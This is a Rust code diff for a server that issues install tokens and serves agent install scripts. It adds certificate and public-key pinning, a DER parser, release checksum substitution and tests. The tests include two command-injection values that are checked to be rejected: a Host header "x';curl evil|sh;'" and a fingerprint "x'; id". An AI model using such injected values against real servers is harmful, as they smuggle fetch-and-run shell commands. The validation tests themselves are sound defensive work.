@@ -29,6 +29,8 @@ use tracing::{error, info};
 
 use crate::{auth::AdminUser, security, signaling::SignalingState};
 
+mod sums;
+
 /// Prefix of install tokens (easy to recognise in logs and leaks).
 pub const TOKEN_PREFIX: &str = "lit_";
 pub const MAX_LABEL_CHARS: usize = 64;
@@ -89,6 +91,9 @@ fn token_json((id, label, created_at, expires_at, max_uses, uses, revoked): Toke
 pub async fn create_token(
     admin: AdminUser,
     State(state): State<Arc<SignalingState>>,
+    uri: axum::http::Uri,
+    headers: HeaderMap,
+    extensions: axum::http::Extensions,
     Json(req): Json<CreateInstallToken>,
 ) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
     let label = req.label.trim().to_string();
@@ -128,6 +133,17 @@ pub async fn create_token(
     let mut body = token_json(row);
     // The only time the token itself is shown.
     body["token"] = serde_json::Value::String(token);
+    // Where the command fetches the script from, and how it checks it is
+    // this server (the web builds the command with these).
+    let (via_tls, peer) = request_origin(&extensions);
+    body["install"] = install_fetch(
+        &headers,
+        uri.authority().map(|a| a.as_str()),
+        peer,
+        via_tls,
+        crate::tls::https_port(),
+        own_tls_pins().as_ref(),
+    );
     Ok((StatusCode::CREATED, Json(body)))
 }
 
@@ -316,8 +332,108 @@ pub struct ScriptValues {
     pub server_url: String,
     pub version: String,
     /// Pin for the agent: the certificate of this server's own HTTPS
-    /// listener, when the script was fetched over it.
+    /// listener, when the agent is sent there.
     pub cert_sha256: Option<String>,
+}
+
+/// The release files the scripts install, by their placeholder.
+fn release_files(version: &str) -> [(&'static str, String); 4] {
+    [
+        ("@@SHA256_AGENT_DEB@@", format!("lunaris-agent_{version}_amd64.deb")),
+        ("@@SHA256_HELPER_DEB@@", format!("lunaris-approval-helper_{version}_amd64.deb")),
+        ("@@SHA256_APPIMAGE@@", "lunaris-agent-linux-x86_64.AppImage".to_string()),
+        ("@@SHA256_INSTALLER@@", "lunaris-agent-installer-windows.exe".to_string()),
+    ]
+}
+
+/// This server's own HTTPS listener, as clients pin it: the SHA-256 of its
+/// certificate (hex, what the agent and PowerShell compare) and of its
+/// public key (base64, curl's `--pinnedpubkey sha256//...`).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct TlsPins {
+    pub cert_sha256: String,
+    pub spki_sha256_b64: String,
+}
+
+/// The pins of the certificate the HTTPS listener serves, read from the same
+/// file tls.rs loaded (and checked to be that certificate); None when HTTPS
+/// is off or the file can't be read.
+fn own_tls_pins() -> Option<TlsPins> {
+    static PINS: std::sync::OnceLock<Option<TlsPins>> = std::sync::OnceLock::new();
+    let served = crate::tls::served_cert_sha256()?;
+    PINS.get_or_init(|| {
+        // As tls.rs `cert_paths`: the admin's certificate or the self-signed one.
+        let path = match (std::env::var("LUNARIS_TLS_CERT"), std::env::var("LUNARIS_TLS_KEY")) {
+            (Ok(c), Ok(k)) if !c.is_empty() && !k.is_empty() => std::path::PathBuf::from(c),
+            _ => crate::paths::data_file("tls_cert.pem"),
+        };
+        let file = std::fs::File::open(&path).ok()?;
+        let leaf = rustls_pemfile::certs(&mut std::io::BufReader::new(file)).next()?.ok()?;
+        let pins = tls_pins(leaf.as_ref())?;
+        if pins.cert_sha256 != served {
+            error!("Install command: {} is not the certificate the HTTPS listener serves", path.display());
+            return None;
+        }
+        Some(pins)
+    })
+    .clone()
+}
+
+fn tls_pins(cert_der: &[u8]) -> Option<TlsPins> {
+    use sha2::Digest;
+    let spki = spki_of(cert_der)?;
+    Some(TlsPins {
+        cert_sha256: hex::encode(sha2::Sha256::digest(cert_der)),
+        spki_sha256_b64: sums::base64(&sha2::Sha256::digest(spki)),
+    })
+}
+
+/// One DER element: (tag, the whole element, its content, what follows).
+fn der_next(data: &[u8]) -> Option<(u8, &[u8], &[u8], &[u8])> {
+    let tag = *data.first()?;
+    let first = *data.get(1)?;
+    let (len, head) = if first < 0x80 {
+        (first as usize, 2)
+    } else {
+        let n = (first & 0x7f) as usize;
+        if n == 0 || n > 4 {
+            return None;
+        }
+        let mut len = 0usize;
+        for b in data.get(2..2 + n)? {
+            len = (len << 8) | *b as usize;
+        }
+        (len, 2 + n)
+    };
+    let end = head.checked_add(len)?;
+    let whole = data.get(..end)?;
+    Some((tag, whole, &whole[head..], &data[end..]))
+}
+
+/// The SubjectPublicKeyInfo of an X.509 certificate (RFC 5280: Certificate
+/// { tbsCertificate { [0] version, serial, signature, issuer, validity,
+/// subject, subjectPublicKeyInfo, ... } }).
+fn spki_of(cert_der: &[u8]) -> Option<&[u8]> {
+    let (0x30, _, cert, _) = der_next(cert_der)? else { return None };
+    let (0x30, _, mut tbs, _) = der_next(cert)? else { return None };
+    if tbs.first() == Some(&0xa0) {
+        tbs = der_next(tbs)?.3;
+    }
+    // serial, signature, issuer, validity, subject
+    for _ in 0..5 {
+        tbs = der_next(tbs)?.3;
+    }
+    let (0x30, spki, _, _) = der_next(tbs)? else { return None };
+    Some(spki)
+}
+
+/// Whether the request came over this server's HTTPS listener, and from whom.
+fn request_origin(extensions: &axum::http::Extensions) -> (bool, Option<std::net::IpAddr>) {
+    let via_tls = extensions.get::<crate::tls::ViaTls>().is_some();
+    let peer = extensions
+        .get::<axum::extract::ConnectInfo<crate::signaling::ConnAddrs>>()
+        .map(|c| c.0.remote.ip());
+    (via_tls, peer)
 }
 
 /// `host[:port]` from a Host header: a DNS name or IPv4 address, or an IPv6
@@ -377,20 +493,24 @@ fn last_header<'a>(headers: &'a HeaderMap, name: &str) -> Option<&'a str> {
         .next_back()
 }
 
-/// Works out the script's values from the request, as the web works out the
-/// agent's server address: the address the browser (here: curl) used.
-/// - Through a reverse proxy on this machine (peer is loopback and sent
-///   `X-Forwarded-Proto`/`-Host`): its scheme and host, `wss` for https.
-/// - On this server's own HTTPS listener: `wss` to the same host and port,
-///   with that certificate's SHA-256 for the agent to pin.
-/// - Plain HTTP: `ws` to the same host and port.
-pub fn script_values(
+/// How the request reached this server.
+#[derive(Debug, PartialEq, Eq)]
+enum Reached {
+    /// A reverse proxy on this machine, with the scheme it was reached by.
+    Proxy { https: bool },
+    /// This server's own HTTPS listener.
+    OwnTls,
+    /// Plain HTTP, straight.
+    Plain,
+}
+
+/// The host (and port) the request was made to, and how it came.
+fn reached(
     headers: &HeaderMap,
     uri_authority: Option<&str>,
     peer: Option<std::net::IpAddr>,
     via_tls: bool,
-    served_cert: Option<&str>,
-) -> Result<ScriptValues, &'static str> {
+) -> Result<(String, Reached), &'static str> {
     let from_proxy = peer.is_some_and(|p| match p {
         std::net::IpAddr::V4(v4) => v4.is_loopback(),
         std::net::IpAddr::V6(v6) => v6.is_loopback() || v6.to_ipv4_mapped().is_some_and(|v4| v4.is_loopback()),
@@ -400,60 +520,147 @@ pub fn script_values(
     let host_header = headers.get(header::HOST).and_then(|v| v.to_str().ok());
     let raw_host = forwarded_host.or(host_header).or(uri_authority).ok_or("no Host header")?;
     let host = valid_host(raw_host.trim()).ok_or("bad Host header")?;
-    let (scheme, cert) = match forwarded_proto.map(str::to_ascii_lowercase).as_deref() {
-        Some("https") => ("wss", None),
-        Some("http") => ("ws", None),
+    let how = match forwarded_proto.map(str::to_ascii_lowercase).as_deref() {
+        Some("https") => Reached::Proxy { https: true },
+        Some("http") => Reached::Proxy { https: false },
         Some(_) => return Err("bad X-Forwarded-Proto header"),
-        None if via_tls => ("wss", served_cert.map(str::to_owned)),
-        None => ("ws", None),
+        None if via_tls => Reached::OwnTls,
+        None => Reached::Plain,
     };
-    if let Some(c) = &cert {
-        if c.len() != 64 || !c.bytes().all(|b| b.is_ascii_hexdigit()) {
-            return Err("bad certificate fingerprint");
-        }
-    }
-    Ok(ScriptValues {
-        server_url: format!("{scheme}://{host}"),
-        version: env!("CARGO_PKG_VERSION").to_string(),
-        cert_sha256: cert,
-    })
+    Ok((host, how))
 }
 
-/// The template with the values filled in (all of them checked to hold only
-/// `[A-Za-z0-9.:/\[\]-]`, so they can't break out of the quotes).
-pub fn render(template: &str, values: &ScriptValues) -> String {
-    template
+/// `host[:port]` (checked by [`valid_host`]) without the port.
+fn without_port(host: &str) -> &str {
+    if host.starts_with('[') {
+        host.find(']').map_or(host, |i| &host[..=i])
+    } else {
+        host.rsplit_once(':').map_or(host, |(h, _)| h)
+    }
+}
+
+fn plausible_fingerprint(cert: &str) -> bool {
+    cert.len() == 64 && cert.bytes().all(|b| b.is_ascii_hexdigit())
+}
+
+/// Works out the script's values from the request, as the web works out the
+/// agent's server address: the address the browser (here: curl) used.
+/// - Through a reverse proxy on this machine (peer is loopback and sent
+///   `X-Forwarded-Proto`/`-Host`): its scheme and host, `wss` for https.
+/// - On this server's own HTTPS listener: `wss` to the same host and port,
+///   with that certificate's SHA-256 for the agent to pin.
+/// - Plain HTTP: `wss` to the same host on the HTTPS port (`https_port`),
+///   with the pin, so the agent's connection is encrypted and checked even
+///   when the script came over plain HTTP; `ws` only when this server has no
+///   HTTPS listener.
+pub fn script_values(
+    headers: &HeaderMap,
+    uri_authority: Option<&str>,
+    peer: Option<std::net::IpAddr>,
+    via_tls: bool,
+    https_port: Option<u16>,
+    served_cert: Option<&str>,
+) -> Result<ScriptValues, &'static str> {
+    let (host, how) = reached(headers, uri_authority, peer, via_tls)?;
+    if served_cert.is_some_and(|c| !plausible_fingerprint(c)) {
+        return Err("bad certificate fingerprint");
+    }
+    let (server_url, cert) = match (how, https_port, served_cert) {
+        (Reached::Proxy { https: true }, _, _) => (format!("wss://{host}"), None),
+        (Reached::Proxy { https: false }, _, _) => (format!("ws://{host}"), None),
+        (Reached::OwnTls, _, cert) => (format!("wss://{host}"), cert.map(str::to_owned)),
+        (Reached::Plain, Some(port), Some(cert)) => (format!("wss://{}:{port}", without_port(&host)), Some(cert.to_owned())),
+        (Reached::Plain, _, _) => (format!("ws://{host}"), None),
+    };
+    Ok(ScriptValues { server_url, version: env!("CARGO_PKG_VERSION").to_string(), cert_sha256: cert })
+}
+
+/// How the install command fetches the script (POST /api/admin/install-tokens
+/// answers it with the token, the web builds the command from it):
+/// - `script_origin`: an https origin to fetch it from, or null when there is
+///   none (only plain HTTP: the page says that the script is not protected);
+/// - `spki_sha256` / `cert_sha256`: this server's own HTTPS listener, for
+///   curl `--pinnedpubkey` and the PowerShell certificate check (its
+///   certificate is often self-signed); null through a reverse proxy, whose
+///   certificate the computers check as usual.
+pub fn install_fetch(
+    headers: &HeaderMap,
+    uri_authority: Option<&str>,
+    peer: Option<std::net::IpAddr>,
+    via_tls: bool,
+    https_port: Option<u16>,
+    own: Option<&TlsPins>,
+) -> serde_json::Value {
+    let pinned = |origin: String, pins: &TlsPins| {
+        serde_json::json!({ "script_origin": origin, "spki_sha256": pins.spki_sha256_b64, "cert_sha256": pins.cert_sha256 })
+    };
+    let none = serde_json::json!({ "script_origin": null, "spki_sha256": null, "cert_sha256": null });
+    match reached(headers, uri_authority, peer, via_tls) {
+        Ok((host, Reached::Proxy { https: true })) => {
+            serde_json::json!({ "script_origin": format!("https://{host}"), "spki_sha256": null, "cert_sha256": null })
+        }
+        Ok((host, Reached::OwnTls)) => match own {
+            Some(pins) => pinned(format!("https://{host}"), pins),
+            None => none,
+        },
+        Ok((host, Reached::Plain)) => match (https_port, own) {
+            (Some(port), Some(pins)) => pinned(format!("https://{}:{port}", without_port(&host)), pins),
+            _ => none,
+        },
+        _ => none,
+    }
+}
+
+/// The template with the values filled in. Everything put in is checked to
+/// hold only `[A-Za-z0-9.:/\[\]+=-]` (no quote, no `$`, no space), so it
+/// can't break out of the quotes. `sums`: the release's verified
+/// SHA256SUMS, when the server could get it: the expected SHA-256 of each
+/// file is written in (empty otherwise: the script checks the list itself).
+pub fn render(template: &str, values: &ScriptValues, sums: Option<&[u8]>) -> String {
+    let mut out = template
         .replace("@@SERVER_URL@@", &values.server_url)
         .replace("@@VERSION@@", &values.version)
         .replace("@@CERT_SHA256@@", values.cert_sha256.as_deref().unwrap_or(""))
+        .replace("@@RELEASE_KEY@@", &sums::release_key_spki_b64());
+    for (placeholder, name) in release_files(&values.version) {
+        let digest = sums.and_then(|s| sums::sha256_of(s, &name)).unwrap_or_default();
+        out = out.replace(placeholder, &digest);
+    }
+    out
 }
 
-fn script_response(req: axum::extract::Request, template: &str) -> Response {
-    let via_tls = req.extensions().get::<crate::tls::ViaTls>().is_some();
-    let peer = req
-        .extensions()
-        .get::<axum::extract::ConnectInfo<crate::signaling::ConnAddrs>>()
-        .map(|c| c.0.remote.ip());
+async fn script_response(req: axum::extract::Request, template: &str) -> Response {
+    let (via_tls, peer) = request_origin(req.extensions());
     let authority = req.uri().authority().map(|a| a.as_str().to_string());
-    let values = script_values(req.headers(), authority.as_deref(), peer, via_tls, crate::tls::served_cert_sha256());
+    let values = script_values(
+        req.headers(),
+        authority.as_deref(),
+        peer,
+        via_tls,
+        crate::tls::https_port(),
+        crate::tls::served_cert_sha256(),
+    );
     let no_store = [
         (header::CONTENT_TYPE, HeaderValue::from_static("text/plain; charset=utf-8")),
         (header::CACHE_CONTROL, HeaderValue::from_static("no-store")),
     ];
     match values {
-        Ok(v) => (StatusCode::OK, no_store, render(template, &v)).into_response(),
+        Ok(v) => {
+            let sums = sums::verified_sums(&v.version).await;
+            (StatusCode::OK, no_store, render(template, &v, sums.as_deref().map(Vec::as_slice))).into_response()
+        }
         Err(why) => (StatusCode::BAD_REQUEST, no_store, format!("error: {why}\n")).into_response(),
     }
 }
 
 // GET /install/agent.sh
 pub async fn agent_sh(req: axum::extract::Request) -> Response {
-    script_response(req, SH_TEMPLATE)
+    script_response(req, SH_TEMPLATE).await
 }
 
 // GET /install/agent.ps1
 pub async fn agent_ps1(req: axum::extract::Request) -> Response {
-    script_response(req, PS1_TEMPLATE)
+    script_response(req, PS1_TEMPLATE).await
 }
 
 #[cfg(test)]
@@ -641,7 +848,11 @@ mod tests {
         let state = Arc::new(SignalingState::new(db.clone(), "t".into(), None));
         let admin = || AdminUser { user_id: "a1".into(), username: "admin".into() };
         let req = CreateInstallToken { label: "Lab PCs".into(), valid_hours: 24, max_uses: Some(10) };
-        let r = create_token(admin(), State(state.clone()), Json(req)).await.ok().unwrap().into_response();
+        let r = create_token(admin(), State(state.clone()), uri(), host_only("srv.lan:8090"), Default::default(), Json(req))
+            .await
+            .ok()
+            .unwrap()
+            .into_response();
         assert_eq!(r.status(), StatusCode::CREATED);
         let body: serde_json::Value =
             serde_json::from_slice(&axum::body::to_bytes(r.into_body(), 1 << 16).await.unwrap()).unwrap();
@@ -651,6 +862,8 @@ mod tests {
         assert_eq!(body["max_uses"], 10);
         assert_eq!(body["uses"], 0);
         assert_eq!(body["revoked"], false);
+        // How the command fetches the script (no HTTPS listener in tests).
+        assert!(body["install"]["script_origin"].is_null());
         // "YYYY-MM-DD HH:MM:SS", UTC.
         let created = body["created_at"].as_str().unwrap();
         assert_eq!(created.len(), 19);
@@ -673,9 +886,17 @@ mod tests {
 
         for (label, hours, max) in [("x".repeat(65), 1, None), ("ok".into(), 0, None), ("ok".into(), 721, None), ("ok".into(), 1, Some(0))] {
             let req = CreateInstallToken { label, valid_hours: hours, max_uses: max };
-            let r = create_token(admin(), State(state.clone()), Json(req)).await;
+            let r = create_token(admin(), State(state.clone()), uri(), host_only("srv.lan:8090"), Default::default(), Json(req)).await;
             assert_eq!(r.err().unwrap().0, StatusCode::BAD_REQUEST);
         }
+    }
+
+    fn uri() -> axum::http::Uri {
+        axum::http::Uri::from_static("/api/admin/install-tokens")
+    }
+
+    fn host_only(host: &str) -> HeaderMap {
+        headers(&[("host", host)])
     }
 
     fn headers(pairs: &[(&str, &str)]) -> HeaderMap {
@@ -704,33 +925,89 @@ mod tests {
         let lan: Option<std::net::IpAddr> = Some("192.168.1.20".parse().unwrap());
         let lo: Option<std::net::IpAddr> = Some("127.0.0.1".parse().unwrap());
         let fp = "ab".repeat(32);
-        // Plain HTTP.
-        let v = script_values(&headers(&[("host", "srv.lan:8090")]), None, lan, false, Some(&fp)).unwrap();
+        let https = Some(8443);
+        // Plain HTTP without an HTTPS listener: ws to the same address.
+        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, None, None).unwrap();
         assert_eq!(v.server_url, "ws://srv.lan:8090");
         assert_eq!(v.cert_sha256, None);
         assert_eq!(v.version, env!("CARGO_PKG_VERSION"));
+        // Plain HTTP with one: the agent goes to it, pinned.
+        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, https, Some(&fp)).unwrap();
+        assert_eq!(v.server_url, "wss://srv.lan:8443");
+        assert_eq!(v.cert_sha256.as_deref(), Some(fp.as_str()));
+        let v = script_values(&host_only("[fe80::1]:8090"), None, lan, false, https, Some(&fp)).unwrap();
+        assert_eq!(v.server_url, "wss://[fe80::1]:8443");
+        let v = script_values(&host_only("10.0.0.5"), None, lan, false, Some(9443), Some(&fp)).unwrap();
+        assert_eq!(v.server_url, "wss://10.0.0.5:9443");
+        // HTTPS configured but not serving (no certificate loaded): ws as before.
+        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, https, None).unwrap();
+        assert_eq!(v.server_url, "ws://srv.lan:8090");
         // The server's own HTTPS: wss there, with the pin.
-        let v = script_values(&headers(&[("host", "srv.lan:8443")]), None, lan, true, Some(&fp)).unwrap();
+        let v = script_values(&host_only("srv.lan:8443"), None, lan, true, https, Some(&fp)).unwrap();
         assert_eq!(v.server_url, "wss://srv.lan:8443");
         assert_eq!(v.cert_sha256.as_deref(), Some(fp.as_str()));
         // HTTP/2: no Host header, the authority.
-        let v = script_values(&HeaderMap::new(), Some("srv.lan:8443"), lan, true, Some(&fp)).unwrap();
+        let v = script_values(&HeaderMap::new(), Some("srv.lan:8443"), lan, true, https, Some(&fp)).unwrap();
         assert_eq!(v.server_url, "wss://srv.lan:8443");
         // A reverse proxy on this machine.
         let h = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "https"), ("x-forwarded-host", "remote.example.com")]);
-        let v = script_values(&h, None, lo, false, Some(&fp)).unwrap();
+        let v = script_values(&h, None, lo, false, https, Some(&fp)).unwrap();
         assert_eq!(v.server_url, "wss://remote.example.com");
         assert_eq!(v.cert_sha256, None);
+        let hp = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "http"), ("x-forwarded-host", "remote.lan")]);
+        assert_eq!(script_values(&hp, None, lo, false, https, Some(&fp)).unwrap().server_url, "ws://remote.lan");
         // Forwarded headers from elsewhere are not trusted.
-        let v = script_values(&h, None, lan, false, None).unwrap();
+        let v = script_values(&h, None, lan, false, None, None).unwrap();
         assert_eq!(v.server_url, "ws://127.0.0.1:8090");
         // Bad hosts are refused, also through a proxy.
-        assert!(script_values(&headers(&[("host", "x';curl evil|sh;'")]), None, lan, false, None).is_err());
+        assert!(script_values(&host_only("x';curl evil|sh;'"), None, lan, false, https, Some(&fp)).is_err());
         let h = headers(&[("host", "ok:1"), ("x-forwarded-host", "a b")]);
-        assert!(script_values(&h, None, lo, false, None).is_err());
+        assert!(script_values(&h, None, lo, false, None, None).is_err());
         let h = headers(&[("host", "ok:1"), ("x-forwarded-proto", "gopher")]);
-        assert!(script_values(&h, None, lo, false, None).is_err());
-        assert!(script_values(&HeaderMap::new(), None, lan, false, None).is_err());
+        assert!(script_values(&h, None, lo, false, None, None).is_err());
+        assert!(script_values(&HeaderMap::new(), None, lan, false, None, None).is_err());
+        assert!(script_values(&host_only("ok:1"), None, lan, true, https, Some("x'; id")).is_err());
+    }
+
+    #[test]
+    fn install_command_fetches_over_pinned_https() {
+        let lan: Option<std::net::IpAddr> = Some("192.168.1.20".parse().unwrap());
+        let lo: Option<std::net::IpAddr> = Some("127.0.0.1".parse().unwrap());
+        let pins = TlsPins { cert_sha256: "cd".repeat(32), spki_sha256_b64: "c3BraQ==".into() };
+        // The page on plain HTTP: the script comes from the HTTPS port, pinned.
+        let v = install_fetch(&host_only("srv.lan:8090"), None, lan, false, Some(8443), Some(&pins));
+        assert_eq!(v["script_origin"], "https://srv.lan:8443");
+        assert_eq!(v["spki_sha256"], "c3BraQ==");
+        assert_eq!(v["cert_sha256"], "cd".repeat(32));
+        // On the HTTPS listener: the same address.
+        let v = install_fetch(&host_only("srv.lan:8443"), None, lan, true, Some(8443), Some(&pins));
+        assert_eq!(v["script_origin"], "https://srv.lan:8443");
+        assert_eq!(v["spki_sha256"], "c3BraQ==");
+        // A proxy with https: its address, its certificate checked as usual.
+        let h = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "https"), ("x-forwarded-host", "remote.example.com")]);
+        let v = install_fetch(&h, None, lo, false, Some(8443), Some(&pins));
+        assert_eq!(v["script_origin"], "https://remote.example.com");
+        assert!(v["spki_sha256"].is_null() && v["cert_sha256"].is_null());
+        // No HTTPS at all: nothing to fetch it securely from.
+        assert!(install_fetch(&host_only("srv.lan:8090"), None, lan, false, None, None)["script_origin"].is_null());
+        let hp = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "http")]);
+        assert!(install_fetch(&hp, None, lo, false, Some(8443), Some(&pins))["script_origin"].is_null());
+    }
+
+    #[test]
+    fn pins_come_from_the_certificate() {
+        let made = rcgen::generate_simple_self_signed(vec!["srv.lan".to_string()]).unwrap();
+        let der = made.cert.der().to_vec();
+        let pins = tls_pins(&der).unwrap();
+        assert_eq!(pins.cert_sha256, crate::tls::cert_sha256(&der));
+        // The SubjectPublicKeyInfo is the key rcgen made.
+        let spki = spki_of(&der).unwrap();
+        use rcgen::PublicKeyData;
+        assert_eq!(spki, made.signing_key.subject_public_key_info().as_slice());
+        use sha2::Digest;
+        assert_eq!(pins.spki_sha256_b64, sums::base64(&sha2::Sha256::digest(spki)));
+        assert!(tls_pins(b"not a certificate").is_none());
+        assert!(tls_pins(&der[..der.len() / 2]).is_none());
     }
 
     #[test]
@@ -740,16 +1017,33 @@ mod tests {
             version: "9.8.7".into(),
             cert_sha256: Some("cd".repeat(32)),
         };
+        let sums = format!(
+            "# lunaris 9.8.7\n{}  lunaris-agent_9.8.7_amd64.deb\n{}  lunaris-agent-installer-windows.exe\n",
+            "11".repeat(32),
+            "22".repeat(32)
+        );
         for template in [SH_TEMPLATE, PS1_TEMPLATE] {
-            let out = render(template, &values);
-            assert!(!out.contains("@@"), "placeholder left");
-            assert!(out.contains("'wss://srv.lan:8443'"));
-            assert!(out.contains("'9.8.7'"));
-            assert!(out.contains(&format!("'{}'", "cd".repeat(32))));
-            assert!(out.is_ascii(), "PowerShell 5.1 reads scripts best as ASCII");
-            assert!(!out.contains('\r'));
+            for sums in [None, Some(sums.as_bytes())] {
+                let out = render(template, &values, sums);
+                assert!(!out.contains("@@"), "placeholder left");
+                assert!(out.contains("'wss://srv.lan:8443'"));
+                assert!(out.contains("'9.8.7'"));
+                assert!(out.contains(&format!("'{}'", "cd".repeat(32))));
+                assert!(out.is_ascii(), "PowerShell 5.1 reads scripts best as ASCII");
+                assert!(!out.contains('\r'));
+            }
         }
-        let plain = render(SH_TEMPLATE, &ScriptValues { cert_sha256: None, ..values });
+        // The verified hashes are written in; a file not in the list stays empty.
+        let sh = render(SH_TEMPLATE, &values, Some(sums.as_bytes()));
+        assert!(sh.contains(&format!("RELEASE_KEY='{}'", sums::release_key_spki_b64())));
+        assert!(sh.contains(&format!("PINNED_AGENT_DEB='{}'", "11".repeat(32))));
+        assert!(sh.contains("PINNED_HELPER_DEB=''"));
+        assert!(sh.contains("PINNED_APPIMAGE=''"));
+        let ps = render(PS1_TEMPLATE, &values, Some(sums.as_bytes()));
+        assert!(ps.contains(&format!("$PinnedInstaller = '{}'", "22".repeat(32))));
+        let ps = render(PS1_TEMPLATE, &values, None);
+        assert!(ps.contains("$PinnedInstaller = ''"));
+        let plain = render(SH_TEMPLATE, &ScriptValues { cert_sha256: None, ..values }, None);
         assert!(plain.contains("CERT_SHA256=''"));
     }
 
@@ -761,7 +1055,7 @@ mod tests {
         let dir = std::env::temp_dir().join(format!("lunaris-install-{}", security::random_hex(6)));
         std::fs::create_dir_all(&dir).unwrap();
         let path = dir.join("agent.sh");
-        std::fs::write(&path, render(SH_TEMPLATE, &values)).unwrap();
+        std::fs::write(&path, render(SH_TEMPLATE, &values, None)).unwrap();
         let out = std::process::Command::new(bash).arg("-n").arg(&path).output().unwrap();
         let _ = std::fs::remove_dir_all(&dir);
         assert!(out.status.success(), "bash -n: {}", String::from_utf8_lossy(&out.stderr));
